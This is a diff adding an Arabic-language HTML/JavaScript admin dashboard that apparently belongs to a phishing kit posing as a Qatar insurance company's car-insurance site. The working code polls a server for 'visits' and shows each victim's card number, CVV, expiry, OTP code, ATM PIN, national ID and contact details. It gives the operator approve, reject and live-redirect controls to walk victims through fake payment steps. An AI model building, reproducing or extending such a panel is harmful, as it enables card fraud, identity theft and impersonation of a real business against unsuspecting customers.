@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة تحكم قطر للتأمين</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+    background: #f3f2f7;
+    color: #1c1830;
+    padding: 24px 20px 60px;
+  }
+  .wrap { max-width: 1200px; margin: 0 auto; }
+
+  .header-row {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 22px; flex-wrap: wrap; gap: 14px;
+  }
+  .title { font-size: 24px; font-weight: 700; }
+  .subtitle { font-size: 14px; color: #6f6c83; margin-top: 4px; }
+
+  .active-pill {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: #fff; border: 1px solid #e6e4f0; border-radius: 999px;
+    padding: 10px 18px; font-size: 15px; font-weight: 600; color: #1c1830;
+    box-shadow: 0 2px 8px rgba(20,15,60,0.05);
+  }
+  .active-dot {
+    width: 9px; height: 9px; border-radius: 50%; background: #4fc271;
+    box-shadow: 0 0 0 0 rgba(79,194,113,0.6);
+    animation: pulse 1.6s infinite;
+  }
+  @keyframes pulse {
+    0% { box-shadow: 0 0 0 0 rgba(79,194,113,0.5); }
+    70% { box-shadow: 0 0 0 8px rgba(79,194,113,0); }
+    100% { box-shadow: 0 0 0 0 rgba(79,194,113,0); }
+  }
+
+  .table-card {
+    background: #fff; border-radius: 18px; border: 1px solid #e6e4f0;
+    overflow: hidden; box-shadow: 0 2px 12px rgba(20,15,60,0.04);
+  }
+  table { width: 100%; border-collapse: collapse; min-width: 760px; }
+  thead th {
+    text-align: right; font-size: 13px; color: #6f6c83; font-weight: 600;
+    padding: 14px 18px; background: #f7f6fb; border-bottom: 1px solid #e6e4f0;
+    white-space: nowrap;
+  }
+  tbody td {
+    padding: 14px 18px; font-size: 14.5px; color: #1c1830; border-bottom: 1px solid #f2f1fa;
+    white-space: nowrap;
+  }
+  tbody tr:last-child td { border-bottom: none; }
+  tbody tr:hover { background: #fbfaff; }
+
+  .table-scroll { overflow-x: auto; }
+
+  .status-badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    font-size: 12.5px; font-weight: 600; padding: 5px 12px; border-radius: 999px;
+  }
+  .status-active { background: #e8f8ee; color: #2fae5c; }
+  .status-inactive { background: #f2f1fa; color: #8a87a0; }
+  .status-badge .dot { width: 7px; height: 7px; border-radius: 50%; background: currentColor; }
+
+  .lang-tag {
+    font-size: 11px; font-weight: 700; padding: 2px 7px; border-radius: 5px;
+    background: #f0eef8; color: #5b4dd6; margin-inline-start: 6px;
+  }
+
+  .actions-cell { display: flex; gap: 8px; }
+  .btn-small {
+    border: 1px solid #e6e4f0; background: #fff; color: #1c1830; font-size: 13px;
+    padding: 8px 14px; border-radius: 10px; cursor: pointer; font-family: inherit; font-weight: 600;
+  }
+  .btn-small:hover { background: #f7f6fb; }
+  .btn-small.primary { background: #5b4dd6; color: #fff; border-color: #5b4dd6; }
+  .btn-small.primary:hover { background: #4c40bd; }
+
+  .empty-state {
+    text-align: center; padding: 60px 20px; color: #8a87a0; font-size: 15px;
+  }
+
+  /* Modal */
+  .overlay {
+    position: fixed; inset: 0; background: rgba(20,15,40,0.45);
+    display: flex; align-items: center; justify-content: center;
+    opacity: 0; pointer-events: none; transition: opacity .2s ease; z-index: 999; padding: 20px;
+  }
+  .overlay.open { opacity: 1; pointer-events: auto; }
+  .modal {
+    background: #fff; border-radius: 20px; width: 100%; max-width: 460px;
+    max-height: 85vh; overflow-y: auto; padding: 24px;
+    transform: translateY(12px); transition: transform .2s ease;
+  }
+  .overlay.open .modal { transform: translateY(0); }
+  .modal-title { font-size: 19px; font-weight: 700; margin-bottom: 18px; display: flex; align-items: center; justify-content: space-between; }
+  .modal-close { border: none; background: #f2f1fa; width: 30px; height: 30px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+
+  .detail-row {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 12px 0; border-bottom: 1px solid #f2f1fa; font-size: 14.5px; gap: 10px;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-label { color: #8a87a0; flex-shrink: 0; }
+  .detail-value { color: #1c1830; font-weight: 600; text-align: left; word-break: break-word; }
+
+  .redirect-select {
+    width: 100%; padding: 12px 14px; border-radius: 12px; border: 1px solid #e6e4f0;
+    font-size: 14.5px; font-family: inherit; margin-bottom: 14px; background: #f7f6fb; color: #1c1830;
+  }
+  .redirect-confirm {
+    width: 100%; background: #5b4dd6; color: #fff; border: none; border-radius: 12px;
+    padding: 13px; font-size: 15px; font-weight: 600; cursor: pointer;
+  }
+  .redirect-confirm:hover { background: #4c40bd; }
+  .redirect-note { font-size: 13px; color: #8a87a0; margin-bottom: 14px; line-height: 1.6; }
+
+  /* Login screen */
+  .login-screen {
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    padding: 20px;
+  }
+  .login-card {
+    background: #fff; border-radius: 20px; border: 1px solid #e6e4f0; padding: 32px 26px;
+    width: 100%; max-width: 360px; box-shadow: 0 4px 20px rgba(20,15,60,0.06); text-align: center;
+  }
+  .login-title { font-size: 20px; font-weight: 700; margin-bottom: 6px; }
+  .login-sub { font-size: 13.5px; color: #8a87a0; margin-bottom: 22px; }
+  .login-input {
+    width: 100%; padding: 13px 14px; border-radius: 12px; border: 1px solid #e6e4f0;
+    font-size: 15px; font-family: inherit; margin-bottom: 12px; background: #f7f6fb; color: #1c1830;
+    box-sizing: border-box; text-align: center;
+  }
+  .login-input:focus { outline: none; border-color: #5b4dd6; background: #fff; }
+  .login-btn {
+    width: 100%; background: #5b4dd6; color: #fff; border: none; border-radius: 12px;
+    padding: 13px; font-size: 15px; font-weight: 600; cursor: pointer; font-family: inherit;
+  }
+  .login-btn:hover { background: #4c40bd; }
+  .login-error { color: #e2453c; font-size: 13.5px; margin-bottom: 12px; min-height: 18px; }
+  .logout-link {
+    font-size: 13px; color: #8a87a0; cursor: pointer; text-decoration: underline;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-screen" id="loginScreen">
+  <div class="login-card">
+    <div class="login-title">لوحة تحكم قطر للتأمين</div>
+    <div class="login-sub">أدخل كلمة المرور للدخول للوحة التحكم</div>
+    <div class="login-error" id="loginError"></div>
+    <input type="password" class="login-input" id="loginPassword" placeholder="كلمة المرور" onkeydown="if(event.key==='Enter') doLogin()">
+    <button class="login-btn" onclick="doLogin()">دخول</button>
+  </div>
+</div>
+
+<div class="wrap" id="dashboardWrap" style="display:none;">
+
+  <div class="header-row">
+    <div>
+      <div class="title">لوحة تحكم قطر للتأمين</div>
+      <div class="subtitle">متابعة الزيارات وبيانات المستخدمين لحظيًا</div>
+    </div>
+    <div class="active-pill">
+      <span class="active-dot"></span>
+      <span id="activeCountLabel">الزيارات النشطة: 0</span>
+      <span class="logout-link" onclick="doLogout()" style="margin-inline-start:10px;">خروج</span>
+    </div>
+  </div>
+
+  <div class="table-card">
+    <div class="table-scroll">
+      <table>
+        <thead>
+          <tr>
+            <th>رقم الجوال</th>
+            <th>رقم البطاقة</th>
+            <th>المرحلة</th>
+            <th>الحالة</th>
+            <th>الإجراءات</th>
+          </tr>
+        </thead>
+        <tbody id="visitsBody">
+        </tbody>
+      </table>
+    </div>
+    <div class="empty-state" id="emptyState" style="display:none;">لا توجد زيارات بعد. الزيارات هتظهر هنا أول ما حد يفتح الموقع.</div>
+  </div>
+
+</div>
+
+<!-- Details Modal -->
+<div class="overlay" id="detailsOverlay" onclick="if(event.target===this) closeDetails()">
+  <div class="modal">
+    <div class="modal-title">
+      <span>تفاصيل الزيارة</span>
+      <button class="modal-close" onclick="closeDetails()">✕</button>
+    </div>
+    <div id="detailsBody"></div>
+  </div>
+</div>
+
+<!-- Redirect Modal -->
+<div class="overlay" id="redirectOverlay" onclick="if(event.target===this) closeRedirect()">
+  <div class="modal">
+    <div class="modal-title">
+      <span>إعادة توجيه الزائر</span>
+      <button class="modal-close" onclick="closeRedirect()">✕</button>
+    </div>
+    <p class="redirect-note">هيتم توجيه الزائر تلقائيًا للصفحة دي في أقرب تحديث (خلال ثوانٍ) طالما هو لسه فاتح الموقع.</p>
+    <select class="redirect-select" id="redirectTarget"></select>
+    <button class="redirect-confirm" onclick="confirmRedirect()">تأكيد إعادة التوجيه</button>
+  </div>
+</div>
+
+<script>
+var PAGES_AR = [
+  ['index.html', 'الصفحة الرئيسية'],
+  ['car-insurance-plan.html', '1. اختيار خطة التأمين'],
+  ['car-data-form.html', '2. بيانات السيارة'],
+  ['car-details-form.html', '3. البيانات المطلوبة'],
+  ['car-confirmation-form.html', '4. صفحة الانتظار'],
+  ['car-insurance-selection.html', '5. اختيار نوع التأمين'],
+  ['car-plate-form.html', '6. رقم اللوحة'],
+  ['car-personal-info-form.html', '7. البيانات الشخصية'],
+  ['car-start-date-form.html', '8. تاريخ بدء التأمين'],
+  ['car-checkout-form.html', '9. الدفع'],
+];
+var PAGES_EN = [
+  ['index-en.html', 'Home Page'],
+  ['car-insurance-plan-en.html', '1. Plan Selection'],
+  ['car-data-form-en.html', '2. Car Data'],
+  ['car-details-form-en.html', '3. Required Details'],
+  ['car-confirmation-form-en.html', '4. Please Wait'],
+  ['car-insurance-selection-en.html', '5. Insurance Type'],
+  ['car-plate-form-en.html', '6. Plate Number'],
+  ['car-personal-info-form-en.html', '7. Personal Info'],
+  ['car-start-date-form-en.html', '8. Start Date'],
+  ['car-checkout-form-en.html', '9. Checkout'],
+];
+
+var currentVisits = [];
+var activeRedirectVisitId = null;
+
+function fmtDate(ts) {
+  if (!ts) return '—';
+  var d = new Date(ts);
+  return d.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+}
+
+function escapeHtml(s) {
+  if (s === undefined || s === null || s === '') return '—';
+  return String(s).replace(/[&<>"']/g, function(c) {
+    return { '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' }[c];
+  });
+}
+
+function renderTable() {
+  var body = document.getElementById('visitsBody');
+  var empty = document.getElementById('emptyState');
+  var activeCount = currentVisits.filter(function(v){ return v.status === 'active'; }).length;
+  document.getElementById('activeCountLabel').textContent = 'الزيارات النشطة: ' + activeCount;
+
+  if (currentVisits.length === 0) {
+    body.innerHTML = '';
+    empty.style.display = 'block';
+    return;
+  }
+  empty.style.display = 'none';
+
+  body.innerHTML = currentVisits.map(function(v) {
+    var statusClass = v.status === 'active' ? 'status-active' : 'status-inactive';
+    var statusText = v.status === 'active' ? 'نشط الآن' : 'غير نشط';
+    var langTag = v.lang === 'en' ? '<span class="lang-tag">EN</span>' : '<span class="lang-tag">AR</span>';
+    var stageLabels = { card: 'البطاقة', otp: 'OTP', atm: 'الصراف', success: 'مكتمل' };
+    var stageText = stageLabels[v.stage] || 'البطاقة';
+    var decisionText = v.decision === 'rejected' ? ' (مرفوض)' : (v.decision === 'approved' ? ' (مقبول)' : '');
+    var cardDisplay = v.cardNumber ? formatCard(v.cardNumber) : '—';
+    return '' +
+      '<tr>' +
+        '<td>' + escapeHtml(v.phone) + langTag + '</td>' +
+        '<td style="direction:ltr; text-align:left; font-family:monospace;">' + escapeHtml(cardDisplay) + '</td>' +
+        '<td>' + stageText + decisionText + '</td>' +
+        '<td><span class="status-badge ' + statusClass + '"><span class="dot"></span>' + statusText + '</span></td>' +
+        '<td>' +
+          '<div class="actions-cell">' +
+            '<button class="btn-small" data-visit-id="' + v.visitId + '" onclick="openDetails(this.getAttribute(&quot;data-visit-id&quot;))">التفاصيل</button>' +
+            '<button class="btn-small primary" data-visit-id="' + v.visitId + '" onclick="approveVisit(this.getAttribute(&quot;data-visit-id&quot;))">قبول</button>' +
+            '<button class="btn-small" style="background:#e2453c;color:#fff;border-color:#e2453c;" data-visit-id="' + v.visitId + '" onclick="rejectVisit(this.getAttribute(&quot;data-visit-id&quot;))">رفض</button>' +
+            '<button class="btn-small" data-visit-id="' + v.visitId + '" onclick="openRedirect(this.getAttribute(&quot;data-visit-id&quot;))">توجيه</button>' +
+          '</div>' +
+        '</td>' +
+      '</tr>';
+  }).join('');
+}
+
+function formatCard(num) {
+  if (!num) return '—';
+  var s = String(num);
+  return s.replace(/(.{4})/g, '$1 ').trim();
+}
+
+function approveVisit(id) {
+  authFetch('/api/decision', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ visitId: id, decision: 'approved' })
+  }).then(function() { fetchVisits(); }).catch(function() {
+    alert('تعذر تنفيذ العملية. تأكد أن السيرفر شغال.');
+  });
+}
+
+function rejectVisit(id) {
+  authFetch('/api/decision', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ visitId: id, decision: 'rejected' })
+  }).then(function() { fetchVisits(); }).catch(function() {
+    alert('تعذر تنفيذ العملية. تأكد أن السيرفر شغال.');
+  });
+}
+
+function findVisit(id) {
+  for (var i = 0; i < currentVisits.length; i++) {
+    if (currentVisits[i].visitId === id) return currentVisits[i];
+  }
+  return null;
+}
+
+function openDetails(id) {
+  var v = findVisit(id);
+  if (!v) return;
+  var rows = [
+    ['رقم الجوال', v.phone],
+    ['رقم البطاقة', v.cardNumber ? formatCard(v.cardNumber) : null],
+    ['اسم حامل البطاقة', v.cardHolder],
+    ['تاريخ انتهاء البطاقة', v.cardExpiry],
+    ['CVV', v.cardCvv],
+    ['رمز OTP', v.otp],
+    ['رمز الصراف', v.atmPin],
+    ['المرحلة', v.stage],
+    ['القرار', v.decision],
+    ['رقم القاعدة', v.plate],
+    ['رقم اللوحة', v.plate_no],
+    ['رقم البطاقة القطرية', v.qid],
+    ['الاسم الكامل', v.name],
+    ['البريد الإلكتروني', v.email],
+    ['الجنس', v.gender],
+    ['نوع التأمين', v.planName],
+    ['السعر', v.price ? (v.price + ' ر.ق') : null],
+    ['التغطيات الإضافية', v.features ? v.features.split('|').join('، ') : null],
+    ['تاريخ بدء التأمين', v.start_date],
+    ['اللغة', v.lang === 'en' ? 'إنجليزي' : 'عربي'],
+    ['الصفحة الحالية', v.page],
+    ['آخر تحديث', fmtDate(v.updatedAt)],
+    ['أول زيارة', fmtDate(v.createdAt)],
+  ];
+  document.getElementById('detailsBody').innerHTML = rows.map(function(r) {
+    return '<div class="detail-row"><span class="detail-label">' + r[0] + '</span><span class="detail-value">' + escapeHtml(r[1]) + '</span></div>';
+  }).join('');
+  document.getElementById('detailsOverlay').classList.add('open');
+}
+function closeDetails() {
+  document.getElementById('detailsOverlay').classList.remove('open');
+}
+
+function openRedirect(id) {
+  activeRedirectVisitId = id;
+  var v = findVisit(id);
+  var pages = (v && v.lang === 'en') ? PAGES_EN : PAGES_AR;
+  var select = document.getElementById('redirectTarget');
+  select.innerHTML = pages.map(function(p) {
+    return '<option value="' + p[0] + '">' + p[1] + '</option>';
+  }).join('');
+  document.getElementById('redirectOverlay').classList.add('open');
+}
+function closeRedirect() {
+  document.getElementById('redirectOverlay').classList.remove('open');
+  activeRedirectVisitId = null;
+}
+function confirmRedirect() {
+  if (!activeRedirectVisitId) return;
+  var target = document.getElementById('redirectTarget').value;
+  authFetch('/api/redirect', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ visitId: activeRedirectVisitId, target: target })
+  }).then(function() {
+    closeRedirect();
+  }).catch(function() {
+    alert('تعذر تنفيذ إعادة التوجيه. تأكد أن السيرفر شغال (node server.js).');
+  });
+}
+
+function fetchVisits() {
+  authFetch('/api/visits').then(function(r) {
+    if (r.status === 401) { showLogin('انتهت الجلسة، برجاء تسجيل الدخول مرة أخرى'); return null; }
+    return r.json();
+  }).then(function(data) {
+    if (!data) return;
+    currentVisits = data;
+    renderTable();
+  }).catch(function() {
+    document.getElementById('emptyState').style.display = 'block';
+    document.getElementById('emptyState').textContent = 'تعذر الاتصال بالسيرفر. شغّل المشروع عن طريق: node server.js';
+  });
+}
+
+/* ---- Auth ---- */
+var ADMIN_TOKEN_KEY = 'qic_admin_token';
+var pollTimer = null;
+
+function authFetch(url, opts) {
+  opts = opts || {};
+  opts.headers = opts.headers || {};
+  opts.headers['x-admin-token'] = localStorage.getItem(ADMIN_TOKEN_KEY) || '';
+  return fetch(url, opts);
+}
+
+function showLogin(errorMsg) {
+  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  document.getElementById('dashboardWrap').style.display = 'none';
+  document.getElementById('loginScreen').style.display = 'flex';
+  document.getElementById('loginError').textContent = errorMsg || '';
+  localStorage.removeItem(ADMIN_TOKEN_KEY);
+}
+
+function showDashboard() {
+  document.getElementById('loginScreen').style.display = 'none';
+  document.getElementById('dashboardWrap').style.display = 'block';
+  fetchVisits();
+  if (pollTimer) clearInterval(pollTimer);
+  pollTimer = setInterval(fetchVisits, 3000);
+}
+
+function doLogin() {
+  var pw = document.getElementById('loginPassword').value;
+  document.getElementById('loginError').textContent = '';
+  fetch('/api/admin-login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ password: pw })
+  }).then(function(r) { return r.json().then(function(d) { return { status: r.status, body: d }; }); })
+    .then(function(res) {
+      if (res.status === 200 && res.body.token) {
+        localStorage.setItem(ADMIN_TOKEN_KEY, res.body.token);
+        showDashboard();
+      } else {
+        document.getElementById('loginError').textContent = 'كلمة المرور غير صحيحة';
+      }
+    }).catch(function() {
+      document.getElementById('loginError').textContent = 'تعذر الاتصال بالسيرفر. تأكد أن السيرفر شغال (node server.js).';
+    });
+}
+
+function doLogout() {
+  authFetch('/api/admin-logout', { method: 'POST' }).catch(function(){});
+  showLogin();
+}
+
+// On load: try existing token, otherwise show login
+if (localStorage.getItem(ADMIN_TOKEN_KEY)) {
+  authFetch('/api/visits').then(function(r) {
+    if (r.status === 401) { showLogin(); } else { showDashboard(); }
+  }).catch(function() { showLogin(); });
+} else {
+  showLogin();
+}
+</script>
+
+</body>
+</html>
